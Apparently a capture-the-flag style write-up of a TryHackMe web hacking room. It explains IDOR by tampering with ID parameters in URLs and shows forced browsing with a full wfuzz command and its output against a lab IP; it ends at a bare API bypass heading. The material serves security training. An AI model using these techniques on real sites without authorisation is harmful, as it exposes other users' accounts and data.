# Room
https://tryhackme.com/room/zthweb2

# Task 1 - Intro
Topics
* IDOR
* Forced Browsing
* API based Authentication Bypass

# Task 2 - IDOR - Intro
IDOR = Insecure Direct Object Reference.  Exploit a misconfiguration in the way user input is handled in order to gain access to resources you normally wouldn't have access to.

Example
* Changing 1234 in the following URL to 1235 and accessing another account
    ```
    https://example.com/bank?account_number=1234
    ```

# Task 3 - IDOR - Exploitation
Example
* Changing 1 in the following URL to 2 and accessing another note
    ```
    https://example.com/note.php?note=1
    ```

# Task 4 - IDOR - Challenge
Exploit the IDOR and get the flag
```
http://10.10.76.232/note.php?note=
```

# Task 5 - Forced Browsing - Intro
Forced Browsing is similar to IDOR, in addition we add automated tools like wfuzz for the URL to find more things we shouldn't have access to
```
https://example.com/user1/note.txt

https://example.com/user2/note.txt

https://example.com/admin/note.txt

https://example.com/superman/note.txt
```

# Task 6 - Forced Browsing - Manual Exploitation
Examples
```
https://example.com/user1/note.txt

https://example.com/user2/note.txt

https://example.com/admin/note.txt

https://example.com/superman/note.txt
```

# Task 7 - Forced Browsing - Automatic Exploitation
Tools
* wfuzz
* dirsearch

wfuzz
* -c - output in color
* -z - specifies what will replace the FUZZ variable
* --hc - don't show certain HTTP response codes
* --hl - don't show a certain amount of lines in the response
* --hh - don't show a certain amount of words

Install wfuzz
```
pip3 install wfuzz
```

# Task 8 - Forced Browsing - Challenge
Use wfuzz to find the user
```
wfuzz --hc 404 -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.79.80:81/FUZZ/note.txt
 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.79.80:81/FUZZ/note.txt
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                            
=====================================================================

000000001:   200        14 L     28 W       242 Ch      "# directory-list-2.3-medium.txt"                                                  
000000007:   200        14 L     28 W       242 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                  
000000002:   200        14 L     28 W       242 Ch      "#"                                                                                
000000003:   200        14 L     28 W       242 Ch      "# Copyright 2007 James Fisher"                                                    
000000009:   200        14 L     28 W       242 Ch      "# Suite 300, San Francisco, California, 94105, USA."                              
000000006:   200        14 L     28 W       242 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                    
000000010:   200        14 L     28 W       242 Ch      "#"                                                                                
000000005:   200        14 L     28 W       242 Ch      "# This work is licensed under the Creative Commons"                               
000000004:   200        14 L     28 W       242 Ch      "#"                                                                                
000000008:   200        14 L     28 W       242 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                       
000000012:   200        14 L     28 W       242 Ch      "# on atleast 2 different hosts"                                                   
000000011:   200        14 L     28 W       242 Ch      "# Priority ordered case sensative list, where entries were found"                 
000000013:   200        14 L     28 W       242 Ch      "#"                                                                                
000000466:   200        1 L      1 W        20 Ch       "[removed]"                                                                         
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 796
Filtered Requests: 782
Requests/sec.: 0
```

# Task 9 - API Bypassing - Intro